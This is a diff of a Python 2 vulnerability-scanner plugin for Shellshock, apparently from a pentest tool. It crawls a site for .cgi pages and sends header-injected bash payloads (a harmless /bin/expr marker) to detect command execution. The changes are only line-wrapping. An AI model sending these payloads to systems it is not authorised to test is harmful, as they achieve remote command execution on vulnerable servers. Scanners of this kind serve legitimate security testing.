@@ -4,6 +4,7 @@ import re
 import urlparse
 import HTMLParser
 
+
 def get_plugin_info():
     plugin_info = {
         "name": "shellshock破壳",
@@ -31,7 +32,8 @@ def get_url(domain, timeout):
                 if domain == ParseResult.hostname:
                     url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
             elif not ParseResult.netloc and not ParseResult.scheme:
-                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
+                url_list.append(HTMLParser.HTMLParser().unescape(
+                    urlparse.urljoin(root_url, url[1])))
     return list(set(url_list))
 
 
@@ -41,14 +43,17 @@ def check(ip, port, timeout):
     except Exception, e:
         return
     try:
-        flag_list = ['() { :; }; /bin/expr 32001611 - 100', '{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}']
+        flag_list = ['() { :; }; /bin/expr 32001611 - 100',
+                     '{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}']
         i = 0
         for url in url_list:
             if '.cgi' in url:
                 i += 1
-                if i >= 4: return
+                if i >= 4:
+                    return
                 for flag in flag_list:
-                    header = {'cookie': flag, 'User-Agent': flag, 'Referrer': flag}
+                    header = {'cookie': flag,
+                              'User-Agent': flag, 'Referrer': flag}
                     try:
                         request = urllib2.Request(url, headers=header)
                         res_html = urllib2.urlopen(request).read()
@@ -58,4 +63,3 @@ def check(ip, port, timeout):
                         return u'shellshock命令执行漏洞'
     except Exception, e:
         pass
-
